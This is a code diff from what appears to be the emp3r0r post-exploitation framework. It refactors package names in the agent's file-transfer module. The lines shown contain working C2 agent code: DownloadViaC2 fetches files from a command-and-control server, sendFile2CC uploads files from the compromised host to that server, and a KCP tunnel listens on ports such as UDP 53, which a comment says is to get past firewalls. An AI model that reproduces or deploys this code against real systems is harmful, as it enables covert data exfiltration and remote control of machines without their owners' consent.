@@ -13,9 +13,9 @@ import (
 	"time"
 
 	"github.com/cavaliergopher/grab/v3"
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archives"
 )
@@ -26,7 +26,7 @@ import (
 func SmartDownload(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
-		if emp3r0r_crypto.SHA256SumFile(path) == checksum {
+		if crypto.SHA256SumFile(path) == checksum {
 			log.Printf("SmartDownload: %s already exists and checksum matches", path)
 			return
 		}
@@ -38,7 +38,7 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 		err = RequestAndDownloadFile(download_addr, file_to_download, path, checksum)
 		if util.IsFileExist(path) {
 			// checksum
-			if emp3r0r_crypto.SHA256SumFile(path) == checksum {
+			if crypto.SHA256SumFile(path) == checksum {
 				log.Printf("SmartDownload: %s downloaded via TCP and checksum matches", path)
 			}
 		}
@@ -52,7 +52,7 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 // if path is empty, return []data instead
 func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
 	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
-		emp3r0r_def.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
+		def.CCAddress, transport.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
 	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
 	retData := false
 	if path == "" {
@@ -72,7 +72,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// use EmpHTTPClient if no path specified
 	if retData {
-		client := tun.EmpHTTPClient(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
+		client := transport.EmpHTTPClient(def.CCAddress, RuntimeConfig.C2TransportProxy)
 		if client == nil {
 			err = fmt.Errorf("failed to initialize HTTP client")
 			return
@@ -98,7 +98,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 			err = fmt.Errorf("DownloadViaCC read body: %v", err)
 			return nil, err
 		}
-		if c := emp3r0r_crypto.SHA256SumRaw(data); c != checksum {
+		if c := crypto.SHA256SumRaw(data); c != checksum {
 			err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", c, checksum)
 			return nil, err
 		}
@@ -107,7 +107,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// use grab
 	client := grab.NewClient()
-	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
+	client.HTTPClient = transport.EmpHTTPClient(def.CCAddress, RuntimeConfig.C2TransportProxy)
 	if client.HTTPClient == nil {
 		err = fmt.Errorf("failed to initialize HTTP client")
 		return
@@ -141,8 +141,8 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 				log.Print(err)
 				return
 			}
-			if checksum != emp3r0r_crypto.SHA256SumFile(path) {
-				err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", emp3r0r_crypto.SHA256SumFile(path), checksum)
+			if checksum != crypto.SHA256SumFile(path) {
+				err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
 				return
 			}
 			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
@@ -176,8 +176,8 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 
 	// connect
 	url := fmt.Sprintf("%s%s/%s",
-		emp3r0r_def.CCAddress,
-		tun.FTPAPI,
+		def.CCAddress,
+		transport.FTPAPI,
 		token)
 	conn, _, _, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
@@ -227,7 +227,7 @@ func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err e
 	// the KCP server will listen on user's specified port while the HTTP server listens on a random port
 	// common ports such as UDP 53 can be specified to bypass firewall
 	portstr := fmt.Sprintf("%d", port)
-	go tun.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
+	go transport.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, def.MagicString, ctx, cancel)
 
 	go func() {
 		<-ctx.Done()
@@ -271,10 +271,10 @@ func RequestAndDownloadFile(address, filepath, path, checksum string) (err error
 
 	// start local KCP client tunnel to connect to KCP server then HTTP server
 	kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
-	go tun.KCPTunClient(address, kcp_listen_port, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
+	go transport.KCPTunClient(address, kcp_listen_port, RuntimeConfig.Password, def.MagicString, ctx, cancel)
 
 	// wait until port is open
-	for !tun.IsPortOpen("127.0.0.1", kcp_listen_port) {
+	for !transport.IsPortOpen("127.0.0.1", kcp_listen_port) {
 		log.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
 		time.Sleep(time.Second)
 	}
@@ -300,8 +300,8 @@ func RequestAndDownloadFile(address, filepath, path, checksum string) (err error
 
 			// if checksum is given, check it
 			if checksum != "" {
-				if checksum != emp3r0r_crypto.SHA256SumFile(path) {
-					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", emp3r0r_crypto.SHA256SumFile(path), checksum)
+				if checksum != crypto.SHA256SumFile(path) {
+					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
 				}
 			}
 			log.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
